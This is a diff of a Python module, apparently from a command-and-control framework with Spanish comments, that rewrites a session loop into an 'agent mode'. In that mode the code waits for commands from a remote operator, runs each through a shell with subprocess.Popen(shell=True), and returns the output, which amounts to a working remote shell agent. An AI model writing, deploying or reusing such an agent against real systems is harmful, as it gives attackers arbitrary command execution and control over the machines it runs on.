@@ -31,31 +31,41 @@ class CommunicationService(ModuleInterface):
     # Private methods
     def _command_loop(self, session) -> None:
         """
-        Bucle de control en modo SERVIDOR. 
-        Envía comandos y procesa resultados del agente conectado.
+        MODO AGENTE: Escucha comandos del operador y los ejecuta localmente.
         """
-        print(f"[{self.MODULE_NAME}] Command loop started as ACTIVE server.")
-        
-        # Ejemplo de comando inicial automático (lógica de Nexus)
-        session.datapackages_handler.send_datapackage({"COMMAND": "whoami"})
+        print(f"[{self.MODULE_NAME}] Agent mode started. Waiting for operator...")
         
         while self.running:
             try:
-                # Recepción de resultados del cliente
-                datapackage = session.datapackages_handler.receive_datapackage(timeout=300)
+                # 1. Bloqueo en recepción de comando (PASSIVE ROLE)
+                datapackage = session.datapackages_handler.receive_datapackage(timeout=None)
                 
-                if datapackage and "RESULT" in datapackage:
-                    result = datapackage.get("RESULT")
-                    print(f"[{self.MODULE_NAME}] Result received:\n{result}")
+                if not datapackage:
+                    continue
+
+                cmd = datapackage.get("COMMAND")
+                if cmd:
+                    if cmd.upper() in ["EXIT", "QUIT"]:
+                        break
                     
-                    # Aquí podrías implementar una cola de comandos (Queue)
-                    # Por ahora, enviamos un keep-alive o esperamos instrucciones
-                    time.sleep(5)
+                    # 2. Ejecución local en el servidor
+                    proc = subprocess.Popen(
+                        cmd, shell=True, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE
+                    )
+                    stdout, stderr = proc.communicate()
+                    output = stdout.decode() + stderr.decode()
+
+                    # 3. Envío de vuelta al operador
+                    session.datapackages_handler.send_datapackage({
+                        "RESULT": output if output else "[*] Command executed."
+                    })
                     
             except Exception as e:
-                print(f"[{self.MODULE_NAME}] Session error or client disconnected: {e}")
+                print(f"[{self.MODULE_NAME}] Session terminated: {e}")
                 break
-        
+
         self.running = False
 
     def start(self) -> bool:
